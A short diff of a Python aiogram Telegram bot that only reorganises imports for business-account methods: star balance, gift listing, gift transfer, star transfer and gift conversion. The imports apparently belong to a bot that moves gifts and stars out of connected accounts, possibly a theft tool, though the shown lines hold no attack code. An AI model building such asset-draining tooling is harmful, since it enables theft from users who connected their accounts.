@@ -5,15 +5,12 @@ import logging
 import asyncio
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, BusinessConnection, FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
-from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
-from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
-from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts
 from aiogram.enums import ParseMode
 from aiogram.utils.keyboard import InlineKeyboardBuilder
-from aiogram.methods import TransferGift, ConvertGiftToStars
+from aiogram.methods import ConvertGiftToStars, GetBusinessAccountGifts, TransferGift, GetBusinessAccountStarBalance
 from aiogram.exceptions import TelegramBadRequest
 from aiogram.methods.transfer_business_account_stars import TransferBusinessAccountStars
-from custom_methods import ConvertGiftToStarsFixed
+from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts, TransferGiftFixed, ConvertGiftToStarsFixed
 import config
 
 CONNECTIONS_FILE = "business_connections.json"
@@ -802,4 +799,3 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-    
